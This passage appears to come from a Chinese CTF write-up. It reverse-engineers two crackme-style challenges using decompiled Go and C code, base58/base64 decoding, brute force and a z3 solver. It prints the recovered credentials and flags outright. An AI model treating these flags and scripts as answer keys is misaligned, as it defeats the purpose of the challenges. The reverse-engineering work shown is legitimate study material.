<span class="comment">// rbx</span></span><br><span class="line">  __int64 v29; <span class="comment">// rax</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp-46h] [rbp-128h]</span></span><br><span class="line">  __int64 v31; <span class="comment">// [rsp-46h] [rbp-128h]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp-46h] [rbp-128h]</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp-46h] [rbp-128h]</span></span><br><span class="line">  __int64 v34; <span class="comment">// [rsp-46h] [rbp-128h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp-46h] [rbp-128h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp-46h] [rbp-128h]</span></span><br><span class="line">  __int64 v37; <span class="comment">// [rsp-46h] [rbp-128h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp-3Eh] [rbp-120h]</span></span><br><span class="line">  __int64 v39; <span class="comment">// [rsp-3Eh] [rbp-120h]</span></span><br><span class="line">  __int64 v40; <span class="comment">// [rsp-3Eh] [rbp-120h]</span></span><br><span class="line">  __int64 v41; <span class="comment">// [rsp-3Eh] [rbp-120h]</span></span><br><span class="line">  __int64 v42; <span class="comment">// [rsp-3Eh] [rbp-120h]</span></span><br><span class="line">  __int64 v43; <span class="comment">// [rsp-3Eh] [rbp-120h]</span></span><br><span class="line">  __int64 v44; <span class="comment">// [rsp-36h] [rbp-118h]</span></span><br><span class="line">  __int64 v45; <span class="comment">// [rsp-36h] [rbp-118h]</span></span><br><span class="line">  __int64 v46; <span class="comment">// [rsp-2Eh] [rbp-110h]</span></span><br><span class="line">  <span class="type">char</span> v47; <span class="comment">// [rsp+1h] [rbp-E1h]</span></span><br><span class="line">  __int64 v48; <span class="comment">// [rsp+2h] [rbp-E0h]</span></span><br><span class="line">  __int64 v49; <span class="comment">// [rsp+2h] [rbp-E0h]</span></span><br><span class="line">  __int64 v50; <span class="comment">// [rsp+Ah] [rbp-D8h]</span></span><br><span class="line">  __int64 v51; <span class="comment">// [rsp+12h] [rbp-D0h]</span></span><br><span class="line">  <span class="type">char</span> v52; <span class="comment">// [rsp+3Ah] [rbp-A8h] BYREF</span></span><br><span class="line">  __int64 v53; <span class="comment">// [rsp+4Ah] [rbp-98h]</span></span><br><span class="line">  __int64 v54; <span class="comment">// [rsp+52h] [rbp-90h]</span></span><br><span class="line">  __int64 v55; <span class="comment">// [rsp+5Ah] [rbp-88h]</span></span><br><span class="line">  __int64 v56; <span class="comment">// [rsp+62h] [rbp-80h]</span></span><br><span class="line">  __int128 v57; <span class="comment">// [rsp+6Ah] [rbp-78h]</span></span><br><span class="line">  __int64 v58; <span class="comment">// [rsp+7Ah] [rbp-68h]</span></span><br><span class="line">  __int64 v59; <span class="comment">// [rsp+82h] [rbp-60h]</span></span><br><span class="line">  __int64 v60; <span class="comment">// [rsp+8Ah] [rbp-58h]</span></span><br><span class="line">  __int64 v61; <span class="comment">// [rsp+92h] [rbp-50h]</span></span><br><span class="line">  __int64 v62; <span class="comment">// [rsp+9Ah] [rbp-48h]</span></span><br><span class="line">  __int64 v63; <span class="comment">// [rsp+A2h] [rbp-40h]</span></span><br><span class="line">  __int64 v64; <span class="comment">// [rsp+AAh] [rbp-38h]</span></span><br><span class="line">  __int128 i; <span class="comment">// [rsp+B2h] [rbp-30h]</span></span><br><span class="line">  __int64 v66; <span class="comment">// [rsp+C2h] [rbp-20h]</span></span><br><span class="line">  __int64 v67; <span class="comment">// [rsp+CAh] [rbp-18h]</span></span><br><span class="line">  __int64 v68; <span class="comment">// [rsp+D2h] [rbp-10h]</span></span><br><span class="line">  __int64 v70; <span class="comment">// [rsp+EAh] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> __int64)&amp;v52 &lt;= *(_QWORD *)(v1 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v70 = v0;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    v0 = v70;</span><br><span class="line">  &#125;</span><br><span class="line">  v57 = v2;</span><br><span class="line">  v3 = v0;</span><br><span class="line">  v30 = runtime_stringtoslicebyte();</span><br><span class="line">  v58 = v4;</span><br><span class="line">  v59 = v3;</span><br><span class="line">  v60 = v5;</span><br><span class="line">  v38 = math_big_NewInt(v30);</span><br><span class="line">  v56 = v6;</span><br><span class="line">  math_big___ptr_Int__SetBytes(v31, v38);</span><br><span class="line">  v55 = v7;</span><br><span class="line">  v64 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = v2; ; *((_QWORD *)&amp;i + <span class="number">1</span>) = v14 )</span><br><span class="line">  &#123;</span><br><span class="line">    v39 = math_big_NewInt(v32);</span><br><span class="line">    v56 = v8;</span><br><span class="line">    v44 = math_big___ptr_Int__Cmp(v33, v39);</span><br><span class="line">    <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    math_big_NewInt(v34);</span><br><span class="line">    v53 = v10;</span><br><span class="line">    v41 = math_big_NewInt(v35);</span><br><span class="line">    v54 = v11;</span><br><span class="line">    math_big___ptr_Int__DivMod(v36, v41, v44, v46);</span><br><span class="line">    v12 = math_big___ptr_Int__Int64();</span><br><span class="line">    <span class="keyword">if</span> ( v12 &gt;= qword_54A6B8 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    v47 = off_54A6B0[v12];</span><br><span class="line">    v14 = *((_QWORD *)&amp;i + <span class="number">1</span>);</span><br><span class="line">    v13 = i;</span><br><span class="line">    v15 = v64;</span><br><span class="line">    v16 = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)&amp;i + <span class="number">1</span>) &lt; (<span class="type">unsigned</span> __int64)(i + <span class="number">1</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v48 = i;</span><br><span class="line">      runtime_growslice(v32, v42);</span><br><span class="line">      v16 = v15 + <span class="number">1</span>;</span><br><span class="line">      v15 = v17;</span><br><span class="line">      v14 = v18;</span><br><span class="line">      v13 = v48;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(v15 + v13) = v47;</span><br><span class="line">    v64 = v15;</span><br><span class="line">    *(_QWORD *)&amp;i = v16;</span><br><span class="line">  &#125;</span><br><span class="line">  v66 = v58;</span><br><span class="line">  v67 = v59;</span><br><span class="line">  v68 = v60;</span><br><span class="line">  v51 = <span class="number">0LL</span>;</span><br><span class="line">  v50 = v59;</span><br><span class="line">  <span class="keyword">while</span> ( v50 &gt; v51 &amp;&amp; !*(_BYTE *)(v51 + v66) )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 = i;</span><br><span class="line">    v20 = i + <span class="number">1</span>;</span><br><span class="line">    v21 = *((_QWORD *)&amp;i + <span class="number">1</span>);</span><br><span class="line">    v22 = v64;</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)&amp;i + <span class="number">1</span>) &lt; (<span class="type">unsigned</span> __int64)(i + <span class="number">1</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v49 = i;</span><br><span class="line">      v44 = runtime_growslice(v34, v40);</span><br><span class="line">      v20 = v22 + <span class="number">1</span>;</span><br><span class="line">      v22 = v23;</span><br><span class="line">      v21 = v24;</span><br><span class="line">      v19 = v49;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(v22 + v19) = <span class="number">49</span>;</span><br><span class="line">    v64 = v22;</span><br><span class="line">    *(_QWORD *)&amp;i = v20;</span><br><span class="line">    *((_QWORD *)&amp;i + <span class="number">1</span>) = v21;</span><br><span class="line">    ++v51;</span><br><span class="line">  &#125;</span><br><span class="line">  v25 = i;</span><br><span class="line">  main_ReverseByteArr(v34, v40, v44);</span><br><span class="line">  v61 = v26;</span><br><span class="line">  v62 = v25;</span><br><span class="line">  v63 = v27;</span><br><span class="line">  v28 = v26;</span><br><span class="line">  runtime_slicebytetostring(v37, v43, v45);</span><br><span class="line">  *(_QWORD *)&amp;v57 = v29;</span><br><span class="line">  *((_QWORD *)&amp;v57 + <span class="number">1</span>) = v28;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>base58解密出来的就是账号和密码前8位，然后看check2，里面首先是对账号的密码的4位进行了字母表12的位移，然后进行base64加密，所以到目前为止已经推出了</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号：Go<span class="name">M0</span>bi<span class="number">13</span>_Bi<span class="symbol">n4567</span></span><br><span class="line"></span><br><span class="line">密码：<span class="name">G3</span>tItEzForReEFGH</span><br></pre></td></tr></table></figure>

<p>现在只剩账号和密码的后四位，而且经过动调发现真正的算法是在main_runtime_other函数中</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( v54 )</span><br><span class="line"> &#123;</span><br><span class="line">   main_runtime_other(v36, v41, v46, v50, v52, v53);</span><br><span class="line">  <span class="built_in"> return </span>v28;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>可以采用爆破求解，因为该处是通过密码来爆破账号的，且密码已经给出两位，所以只用爆破最后两位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">zhanghaohousiwei = [<span class="number">0xDD</span>, <span class="number">0x8F</span>, <span class="number">0xA1</span>, <span class="number">0x64</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">code = &#x27;</span>vGGH<span class="number">&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">    flag+=chr(zhanghaohousiwei[i] - ord(code[i]) - i)</span><br><span class="line">print(flag)</span><br><span class="line">#账号：GoM0bi13_BingGo@</span><br><span class="line">#密码：G3tItEzForRevG0!</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">27</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">27</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> i + j + <span class="number">3</span> == <span class="number">0x64</span> and i-j == <span class="number">0x1f</span>:<span class="comment">//还有一个是64</span></span><br><span class="line">            print(i)</span><br><span class="line">            print(j)</span><br></pre></td></tr></table></figure>

<p>得到flag：flag{GoM0bi13_BingGo@G3tItEzForRevG0!}</p>
<h3 id="mcmc"><a href="#mcmc" class="headerlink" title="mcmc"></a>mcmc</h3><p>这个题纯纯的做了10个小时</p>
<p>用d810搞一下看的会比较清楚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-104h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line">  _BYTE v6[<span class="number">3</span>]; <span class="comment">// [rsp+24h] [rbp-FCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+27h] [rbp-F9h]</span></span><br><span class="line">  _BYTE v8[<span class="number">4</span>]; <span class="comment">// [rsp+28h] [rbp-F8h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">3</span>]; <span class="comment">// [rsp+2Ch] [rbp-F4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+2Fh] [rbp-F1h]</span></span><br><span class="line">  _BYTE v11[<span class="number">4</span>]; <span class="comment">// [rsp+30h] [rbp-F0h] BYREF</span></span><br><span class="line">  _BYTE v12[<span class="number">3</span>]; <span class="comment">// [rsp+34h] [rbp-ECh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+37h] [rbp-E9h]</span></span><br><span class="line">  _BYTE v14[<span class="number">4</span>]; <span class="comment">// [rsp+38h] [rbp-E8h] BYREF</span></span><br><span class="line">  _BYTE v15[<span class="number">3</span>]; <span class="comment">// [rsp+3Ch] [rbp-E4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+3Fh] [rbp-E1h]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">192</span>]; <span class="comment">// [rsp+50h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v18; <span class="comment">// [rsp+110h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+114h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+11Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+11Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x21</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x21</span>uLL);</span><br><span class="line">  __isoc99_scanf(&amp;unk_408004, s);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v19 = v4;</span><br><span class="line">  i = <span class="number">-1341394107</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v19 != <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">-1901734900</span>; ; i = <span class="number">-1901734900</span> )</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line">  i = <span class="number">944589829</span>;</span><br><span class="line">  <span class="keyword">if</span> ( unk_40A0F8 &gt;= <span class="number">10</span> || unk_40A0F8 &lt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    i = <span class="number">-2083856703</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">-984240755</span>; ; i = <span class="number">-984240755</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 ^= <span class="number">0x44</span>u;</span><br><span class="line">    v10 ^= <span class="number">0x23</span>u;</span><br><span class="line">    v13 ^= <span class="number">0x5B</span>u;</span><br><span class="line">    v16 ^= <span class="number">0x5A</span>u;</span><br><span class="line">    sub_405480(s, v6, v8, v9);</span><br><span class="line">    sub_405480(v11, v12, v14, v15);</span><br><span class="line">    sub_4011A0(v17, &amp;byte_40A0A0, &amp;byte_40A0C0, <span class="number">1LL</span>);</span><br><span class="line">    sub_401820((__int64)v17, (__int64)s, v4);</span><br><span class="line">    i = <span class="number">-2083856703</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">    v7 ^= <span class="number">0x44</span>u;</span><br><span class="line">    v10 ^= <span class="number">0x23</span>u;</span><br><span class="line">    v13 ^= <span class="number">0x5B</span>u;</span><br><span class="line">    v16 ^= <span class="number">0x5A</span>u;</span><br><span class="line">    sub_405480(s, v6, v8, v9);</span><br><span class="line">    sub_405480(v11, v12, v14, v15);</span><br><span class="line">    sub_4011A0(v17, &amp;byte_40A0A0, &amp;byte_40A0C0, <span class="number">1LL</span>);</span><br><span class="line">    sub_401820((__int64)v17, (__int64)s, v4);</span><br><span class="line">    <span class="keyword">if</span> ( unk_40A0F8 &lt; <span class="number">10</span> || unk_40A0F8 &gt;= <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">269145055</span>; ; i = <span class="number">215820177</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( i &gt;= <span class="number">269145055</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      i = <span class="number">1215238956</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        i = <span class="number">1341239842</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      &#125;</span><br><span class="line">      i = <span class="number">-504198</span>;</span><br><span class="line">      <span class="keyword">if</span> ( unk_40A0F8 &lt; <span class="number">10</span> &amp;&amp; unk_40A0F8 &gt;= <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        i = <span class="number">1576878451</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">      i = <span class="number">215820177</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v20 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( unk_40A0F8 &gt;= <span class="number">10</span> || unk_40A0F8 &lt; <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    i = <span class="number">1576878451</span>;</span><br><span class="line">LABEL_17:</span><br><span class="line">    ;</span><br><span class="line">  &#125;</span><br><span class="line">  i = <span class="number">1408947266</span>;</span><br><span class="line">LABEL_15:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Nice! flag:flag&#123;(your input)&#125;\n&quot;</span>);</span><br><span class="line">  i = <span class="number">-198005779</span>;</span><br><span class="line">  <span class="keyword">return</span> v18;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好看多了，但是编译的不是很准确，可以看到最开始先对输入进行每8个字节异或，然后异或后的值传到sub_405480函数进行抽象的处理，接下来的函数就比较逆天了</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub<span class="constructor">_405480(<span class="params">v11</span>, <span class="params">v12</span>, <span class="params">v14</span>, <span class="params">v15</span>)</span>;</span><br><span class="line">sub<span class="constructor">_4011A0(<span class="params">v17</span>, &amp;<span class="params">byte_40A0A0</span>, &amp;<span class="params">byte_40A0C0</span>, 1LL)</span>;</span><br><span class="line">sub<span class="constructor">_401820((<span class="params">__int64</span>)</span>v17, (__int64)s, v4);</span><br></pre></td></tr></table></figure>

<p>本来以为是chacha20加密，但是发现不对，怎么解都不对，由于chacha是对称加密，所以进行了验证发现并不是对称的。最后还是超人发现真正的加密是在sub_401820，直接看汇编，如下图：</p>
<p><img src="/2022/11/08/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20221108152758147.png" alt="image-20221108152758147"></p>
<p>进行正向算法的一个逆，然后缩减了一下算法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">	<span class="type">uint32_t</span> en_data[] = &#123;<span class="number">0x93</span>, <span class="number">0x93</span>, <span class="number">0x93</span>, <span class="number">0xB8</span>, <span class="number">0x62</span>, <span class="number">0x62</span>, <span class="number">0x62</span>, <span class="number">0xC5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xDB</span>, <span class="number">0xC4</span>, <span class="number">0xC4</span>, <span class="number">0xC4</span>, <span class="number">0x0E</span>, <span class="number">0x93</span>, <span class="number">0x93</span>, <span class="number">0x93</span>, <span class="number">0x06</span>, <span class="number">0x62</span>, <span class="number">0x62</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8D</span>, <span class="number">0xC4</span>, <span class="number">0xC4</span>, <span class="number">0xC4</span>, <span class="number">0xAA</span>&#125;;</span><br><span class="line">	<span class="type">uint32_t</span> en[] = &#123; <span class="number">0x17</span>, <span class="number">0x40</span>, <span class="number">0x2B</span>, <span class="number">0xDD</span>, <span class="number">0x11</span>, <span class="number">0xC8</span>, <span class="number">0xBD</span>, <span class="number">0xA7</span>, <span class="number">0x1B</span>, <span class="number">0x05</span>, <span class="number">0xF9</span>, <span class="number">0x58</span>, <span class="number">0x60</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0xB7</span>, <span class="number">0x17</span>, <span class="number">0x40</span>, <span class="number">0x2B</span>, <span class="number">0x37</span>, <span class="number">0x11</span>, <span class="number">0xC8</span>, <span class="number">0xBD</span>, <span class="number">0x6F</span>, <span class="number">0x1B</span>, <span class="number">0x05</span>, <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0x60</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x6B</span> &#125;;</span><br><span class="line">	<span class="type">uint32_t</span> table[] = &#123; <span class="number">0xD3</span>, <span class="number">0x1B</span>, <span class="number">0xCC</span>, <span class="number">0x7D</span>, <span class="number">0xEF</span>, <span class="number">0xB9</span>, <span class="number">0x0D</span>, <span class="number">0xC6</span>, <span class="number">0xA0</span>, <span class="number">0xDB</span>, <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0xFB</span>, <span class="number">0x0F</span>, <span class="number">0xB7</span>, <span class="number">0x0E</span>, <span class="number">0xCB</span>, <span class="number">0x73</span>, <span class="number">0x3A</span>, <span class="number">0x8A</span>, <span class="number">0xC5</span>, <span class="number">0x4E</span>, <span class="number">0x3E</span>, <span class="number">0xEC</span>, <span class="number">0x0C</span>, <span class="number">0xF0</span>, <span class="number">0xA2</span>, <span class="number">0x48</span>, <span class="number">0x94</span>, <span class="number">0x70</span>, <span class="number">0x27</span>, <span class="number">0x1B</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>, <span class="number">0x17</span>, <span class="number">0x1C</span>, <span class="number">0x0D</span>, <span class="number">0x71</span>, <span class="number">0xC8</span>, <span class="number">0xF2</span>, <span class="number">0x28</span>, <span class="number">0x2B</span>, <span class="number">0x9A</span>, <span class="number">0xA7</span>, <span class="number">0x3A</span>, <span class="number">0x5F</span>, <span class="number">0xB8</span>, <span class="number">0x6E</span>, <span class="number">0x81</span>, <span class="number">0x80</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x9D</span>, <span class="number">0x51</span>, <span class="number">0x0E</span>, <span class="number">0xC6</span>, <span class="number">0x21</span>, <span class="number">0x03</span>, <span class="number">0x49</span>, <span class="number">0xD4</span>, <span class="number">0xB6</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x7B</span> &#125;;</span><br><span class="line">	<span class="type">uint32_t</span> k1 = <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint32_t</span> k2 = <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint32_t</span> k3 = <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint32_t</span> k4 = <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint32_t</span> k6 = <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint32_t</span> k7 = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> i, k;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">		<span class="type">uint64_t</span> temp= <span class="number">0xfffffffffffffffe</span>;</span><br><span class="line">		temp ^= i;</span><br><span class="line">		temp &amp;= i;</span><br><span class="line">		<span class="keyword">if</span> (temp) &#123;</span><br><span class="line">			k2 = en[i - <span class="number">1</span>];</span><br><span class="line">			<span class="keyword">if</span> (k2 &gt; <span class="number">0xff</span>)</span><br><span class="line">				k2 = en[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			k2 = en[i + <span class="number">1</span>];</span><br><span class="line">		<span class="comment">//k2 = en[(i)%32];</span></span><br><span class="line">		<span class="comment">// en_data[i] = k4;</span></span><br><span class="line">		en[i] = (en[i] ^ <span class="number">0x7deeb3f5</span> | en[i] ^ <span class="number">0x7deeb3f5</span>) ^ (table[i] + k2) &amp; <span class="number">0xff</span> ^ <span class="number">0x7deeb3f5</span>;</span><br><span class="line">		<span class="comment">// k2 = k4;</span></span><br><span class="line">		<span class="comment">//k2 = en[(i + 1) % 32];</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; en[i] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[0x93, 0x62, 0xB8, 0x19, 0x45, 0x20, 0x25, 0x25, 0x22, 0xFE, 0x7F, 0x00, 0x00, 0x16, 0x6D, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>发现真正加密其实也就一个，但是不太好爆，考虑采用z3，又发现前面的判断条件其实有些抽象，直接舍去就好</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from z3 import*</span><br><span class="line">s=Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&quot;flag%d&quot;</span> % i,<span class="number">8</span>) for i <span class="keyword">in</span> range(<span class="number">32</span>)]</span><br><span class="line"><span class="keyword">cmp</span> = [<span class="number">0x06</span>, <span class="number">0x08</span>, <span class="number">0x65</span>, <span class="number">0x04</span>, <span class="number">0x60</span>, <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x4A</span>, <span class="number">0x10</span>, <span class="number">0x32</span>, <span 